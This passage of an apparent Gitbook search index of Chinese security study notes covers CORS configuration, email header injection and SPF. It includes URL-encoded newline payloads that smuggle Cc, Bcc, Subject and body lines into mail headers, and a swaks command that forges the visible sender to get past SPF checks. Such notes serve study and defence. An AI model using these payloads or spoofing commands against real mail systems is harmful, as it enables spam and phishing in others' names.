!= null && !Arrays.asList(authhosts).contains(origin)) { httpresponse.sendError(403); return; } else { for (int i = 0; i 另一种配置方式 把 cors-filter-1.7.jar 与 java-property-utils-1.9.jar 这两个文件放到 tomcat 的 lib 目录下 在 tomcat 的 web.xml 中配置 CORS com.thetransactioncompany.cors.CORSFilter cors.allowOrigin * --> *.xxx.com,http://10.130.222.222:6500 cors.exposedHeaders Set-Cookie cors.supportsCredentials true CORS /* 0x00 前人栽树 跨域资源共享 CORS 详解 - 阮一峰的网络日志 (ruanyifeng.com) -- 可以顺便看看评论 绕过浏览器 SOP，跨站窃取信息：CORS 配置安全漏洞报告及最佳部署实践 | Jianjun Chen | International Computer Science Institute | Network Security -- 推荐阅读 https://web.dev/cross-origin-resource-sharing/ https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS CVE-2018-8014，https://nvd.nist.gov/vuln/detail/CVE-2018-8014 nginx - 前端常见跨域解决方案（全） - 个人文章 - SegmentFault 思否 CORS 介绍及其漏洞检测 - 知乎 (zhihu.com) CORS 跨域漏洞修复 - 不愿透露姓名的汤姆猫 - 博客园 (cnblogs.com) (82 条消息) CORS(跨域资源共享)漏洞解决方法cors 漏洞修复追逐梦想永不停的博客-CSDN 博客 -- 测试方法说明有误 【漏洞利用】跨域资源共享（CORS）漏洞详解 - GorillaLee - 博客园 (cnblogs.com) CORS 完全手冊（一）：為什麼會發生 CORS 錯誤？ · Issue #68 · aszx87410/blog · GitHub (82 条消息) Nginx 跨域配置_程序员小强的博客-CSDN 博客 https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/withCredentials Copyright & Copy zha0cai all right reserved，powered by Gitbook该文件修订时间： 2023-05-14 18:29:10 "},"email/readme.html":{"url":"email/readme.html","title":"Email","keywords":"","body":"关于邮件的知识合集~ Copyright & Copy zha0cai all right reserved，powered by Gitbook该文件修订时间： 2023-05-14 19:28:32 "},"email/Attack Email.html":{"url":"email/Attack Email.html","title":"Attack Email","keywords":"","body":"邮件字段 域名 含义 添加者 Received 传输路径 各级邮件服务器 Return-Path 回复地址 目标邮件服务器 Delivered-To 发送地址 目标邮件服务器 Reply-To 回复地址 邮件的创建者 From 发件人地址 邮件的创建者 To 收件人地址 邮件的创建者 Cc 抄送地址 邮件的创建者 Bcc 暗送地址 邮件的创建者 Date 日期和时间 邮件的创建者 Subject 主题 邮件的创建者 Message-ID 消息ID 邮件的创建者 MIME-Version MIME版本 邮件的创建者 Content-Type 内容的类型 邮件的创建者 Content-Transfer-Encoding 内容的传输编码方式 邮件的创建者 邮件注入 邮件注入和 HTTP 头部注入相似，这种漏洞发生在一个编程语言嵌入另一个，比如 mysql 嵌入php。 对于邮件头部的字段其实就是换行符 0x0A 或者 0x0D0x0A 分割 ，在绝大部分系统里面不是 \\n 就是 \\r\\n，所以就可以注入了。 电子邮件注入是针对邮件功能的一种攻击类型。它允许恶意攻击者注入任何邮件头字段，BCC、CC、主题等，它允许黑客通过注入手段从受害者的邮件服务器发送垃圾邮件。它可能会影响任何从用户 UI 接收消息并发送电子邮件消息的应用程序。这种攻击的主要原因是不适当的用户输入验证或应用程序根本没有验证和过滤机制。 注入分类 发件人，主题，内容 发件人修改 本来发件人就可控，或者在别的字段里重复添加，但是要看邮件服务器针对多个 from 是如何实现的，是取第一个，还是取最后一个，还是如何操作。 from:sender@domain.com%0Afrom:attacker@domain.com 收件人、抄送人注入（Cc/Bcc注入） 在发送者字段(sender)后注入 Cc 和 Bcc 参数 From:sender@domain.com%0ACc:recipient@domain.com%0ABcc:recipient1@domain.com 所以现在，消息将被发送到 recipient 和 recipient1 账户。 主题注入 攻击者注入的假的主题 subject 将被添加到原来的主题中并且在某些情况下将取代原本的主题 subject，这取决于邮件服务行为。即代码编写的容错性，当参数中出现两个 subject 的时候代码是选择丢弃还是后者覆盖。 From:sender@domain.com%0ASubject:This’s%20Fake%20Subject 消息体注入 要注意 SMTP 的 Mail 格式，消息主题和头部 Header 之间有两个换行符(和 HTTP 是一样的)。 From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message. 假消息将被添加到原始消息中。 0x00 前人栽树 邮件注入攻击 Copyright & Copy zha0cai all right reserved，powered by Gitbook该文件修订时间： 2023-05-08 14:20:17 "},"email/邮件协议.html":{"url":"email/邮件协议.html","title":"邮件协议","keywords":"","body":"MIME 邮件格式 SPF What is SPF (Sender Policy Framework) 的缩写，一种以 IP 地址认证电子邮件发件人身份的技术，是非常高效的垃圾邮件解决方案。 接收邮件方会首先检查域名的 SPF 记录，来确定发件人的 IP 地址是否被包含在SPF记录里面，如果在，就认为是一封正确的邮件，否则会认为是一封伪造的邮件进行退回。 借助 SPF 防范仿冒邮件和垃圾邮件 什么是 DNS SPF 记录？ SPF 记录是什么以及它如何工作：SPF 记录全解释 SPF 记录是什么样的？ 官方 SPF 记录文档 SPF 记录必须遵循一定的标准，以便服务器理解其内容。如下是 SPF 记录核心组成部分的示例： v=spf1 ip4=192.0.2.0 ip4=192.0.2.1 include:examplesender.email -all 这个例子让服务器知道这是什么类型的记录，声明对这个域被批准的 IP 地址和第三方，并告知服务器如何处理不符合要求的电子邮件。我们分别说明各组成部分是如何实现这一点的： v=spf1 告诉服务器这里包含一条 SPF 记录。每一条 SPF 记录都必须以这个字符串开始。 然后是 SPF 记录的“客人名单”部分，即授权 IP 地址。在本例中，SPF 记录告诉服务器，ip4=192.0.2.0 和 ip4=192.0.2.1 被授权代表该域发送电子邮件。 include:examplesender.net 是 “include”（包含）标记的示例，该标记告诉服务器，有哪些第三方组织被授权代表该域发送电子邮件。这个标记表示，被包含域（examplesender.net）的 SPF 记录内容应被检查，其中包含的 IP 地址也应被视为已授权。一条 SPF 记录中可包含多个域，但这个标记仅适用于有效的域。 Finally, -all 告诉服务器，SPF 记录中未列出的地址没有被授权发送电子邮件并应被拒绝。 这里的其他可选项包括 ~all：表示未列出的电子邮件将被标记为不安全邮件或垃圾邮件，但仍会被接受；不那么常见的是 +all：表示任何服务器都可以代表该域发送电子邮件。 SPF Record evaluation 邮件服务器中的 SPF 模块在对 SPF 记录中的 terms 进行估值后，向邮件服务器返回认证 (authentication) 结果。 SPF 中有 2 种 terms：mechanisms 以及 modifiers。 SPF 认证结果为以下其中之一： None: 未能有效地解释域名，或者域名上未找到 SPF 记录； Neutral: 发起请求的主机的 IP 地址是否允许并未确定； Pass: 发起请求的主机的 IP 地址被允许； Fail: 发起请求的主机的 IP 地址不被允许； Softfail: 发起请求的主机的 IP 地址可能不被允许； Temperror: SPF 模块在检查时碰到临时网络错误； Permerror: 域名上发布的 SPF 无法解释。这种情况，域名管理员须修复此错误。 如果一直到 SPF 记录的末尾都没有找到匹配，返回 neutral。这是 SPF 估值的缺省值。 SPF qualifiers SPF qualifier 前置于 SPF mechanism，用来指定该 SPF mechanism 的估值结果。以下是所有的 qualifiers，以及对应的结果： \"+\" pass \"-\" fail \"~\" softfail \"?\" neutral SPF mechanisms 有两种 SPF mechanisms：基本 mechanisms 和指定发送者 mechanisms。 基本 mechanisms 有 all 和 include。 指定发送者 mechanisms 有 a，mx，ptr，ip4，ip6，和 exists。 include 可以让 SPF 记录把定义在另外一个 SPF 记录中的第三方 IP 地址包括进来。 要确保 SPF 记录有效，需要注意如下几点： 每个域不能关联多条 SPF 记录。 记录必须以 all 部分结束，或包含一个 redirect: 部分（表示该 SPF 记录由另一个域托管）。 SPF 记录不能包含大写字母。 SPF modifiers SPF 有两个 modifiers：redirect 和 exp。 SPF modifiers 是可选的。 每条 SPF record 中的任何 SPF modifier 只能够使用一次。 未知的 modifiers 会被忽略。 redirect=：在 domain 上面的 SPF 记录会代替当前的 SPF 记录。 exp=：如果 SPF 记录估值失败，并且存在 exp modifier，SPF 返回一个串来解释原因。 EXAMPLE 如： 如果 mail.smtp2go.com 是我的邮件服务器，那么 gmail 服务器收到的源 IP 也肯定是 mail.smtp2go.com 的 IP。 gmail 会校验邮件发送者的 IP 是否存在于 smtp.from 的域名 spf 配置列表里。 使用 Swaks swaks --to rvn0xsy@gmail.com --from admin@qq.com --ehlo gmail.com --body hello --server mail.smtp2go.com -p 2525 -au -ap smtp.from 就是 admin@qq.com，和 mail.smtp2go.com 的 IP 肯定不同，所以 SPF 校验失败，而校验失败的邮件，会有很高的几率被扔到垃圾邮件中。 默认情况下，如果未设置 Mail.From 也就是邮件头的 From，则会使用 smtp.from 作为 Mail.From。 What is a DNS TXT record? DNS“文本”(TXT) 记录允许域管理员将文本输入到域名系统 (DNS) 中。TXT 记录最初的目的是用作存放人类可读笔记的地方。但是，现在也可以将一些机器可读的数据放入 TXT 记录中。 一个域可以有许多 TXT 记录。 https://www.cloudflare.com/zh-cn/learning/dns/dns-records/dns-txt-record/ TXT 记录示例： example.com record type value TTL @ TXT This is an awesome domain!Definitely not spammy. 32600 如今，DNS TXT 记录的两个最重要用途是防止垃圾邮件和域名所有权验证，尽管 TXT 记录最初并非为这些用途而设计。 查询 SPF # nslookup -q=txt 域名 PS C:\\Users\\Zor0> nslookup 默认服务器: public1.114dns.com Address: 114.114.114.114 > set q=txt > xxxmail.cn 服务器: public1.114dns.com Address: 114.114.114.114 非权威应答: xxxmail.cn text = \"v=spf1 include:spf.xxxmail.net -all\" xxxmail.cn text = \"google-site-verification=gaJnHwop8lmlGBgKzMLsyFqJ9TY0_DOdkdM9UBvze0E\" xxxmail.cn text = \"tg31lc1l55edu0a18a5pncvugs\" # 没有 SPF PS C:\\Users\\Zor0> nslookup 默认服务器: UnKnown Address: 192.168.170.16 > set q=txt > 5000.cn 服务器: UnKnown Address: 192.168.170.16 5000.cn primary name server = ns3.dns.com responsible mail addr = admin.dns.com serial = 1546510465 refresh = 7200 (2 hours) retry = 3600 (1 hour) expire = 1209600 (14 days) default TTL = 1800 (30 mins) > SPF 的绕过 我们只需要让 smtp.from 域名中配置的 txt 记录和发信 IP 一直那么就可以通过 SPF 校验。又或者有的域名没有配置 SPF 那么也可以进行伪造。 由于邮件显示的是 Header 中的 From 不是 smtp.from，因此可以将 smtp.from 设置为正常的邮件服务器地址，伪造一个 Mail.From 即可。 swaks --to payloads@aliyun.com --from xx@smtp2go.com --h-From: '管理员' --ehlo gmail.com --body hello --server mail.smtp2go.com -p 2525 -au -ap Gmail 接收到这封邮件后，会校验 --from xx@smtp2go.com 中的 smtp2go.com 是否等于 mail.smtp2go.com 的 IP，由于是相等的，所以完成了 SPF 的校验。 而 DKIM 是校验邮件完整性的，smtp2go 与 Gmail 直接使用的是 TLS，不会发生什么问题。 0x00 前人栽树 https://payloads.online/archivers/2019-05-09/1/ Copyright & Copy zha0cai all right reserved，powered by Gitbook该文件修订时间： 2023-05-14 17:51:41 "}}